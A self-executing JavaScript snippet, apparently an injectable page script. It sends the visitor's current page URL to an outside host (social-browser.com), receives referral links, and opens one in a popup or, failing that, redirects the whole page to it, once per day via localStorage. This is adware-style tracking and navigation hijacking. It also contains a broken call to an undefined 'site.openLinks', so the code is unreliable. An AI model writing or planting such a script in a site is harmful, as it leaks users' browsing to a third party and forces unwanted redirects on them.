(function () {
  function openLinks(links) {
    if (links.length === 0) {
      return false;
    }
    let isite = localStorage.getItem('isite');
    if (isite) {
      isite = JSON.parse(isite);

      isite.links.forEach((l, i) => {
        if ((new Date().getTime() - l.time) / 1000 > 60 * 60 * 24 * 30) {
          isite.links.splice(i, 1);
        }
      });
      localStorage.setItem('isite', JSON.stringify(isite));
      if (isite.day == new Date().getDate()) {
        return false;
      }
    } else {
      isite = { links: [] };
    }

    let link = links.pop();
    if (isite.links.some((l) => l.url == link.url)) {
      site.openLinks(links);
    } else {
      isite.links.push({ ...link, time: new Date().getTime() });
      isite.day = new Date().getDate();
      localStorage.setItem('isite', JSON.stringify(isite));
      if ((w = window.open(link.url))) {
      } else {
        document.location.href = link.url;
      }
    }
  }

  function fetchLinks() {
    fetch('//social-browser.com/api/ref-links?page=' + document.location.href, {
      mode: 'cors',
      method: 'post',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
      },
      redirect: 'follow',
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.done && data.links) {
          openLinks(data.links);
        }
      });
  }

  fetchLinks();
})();
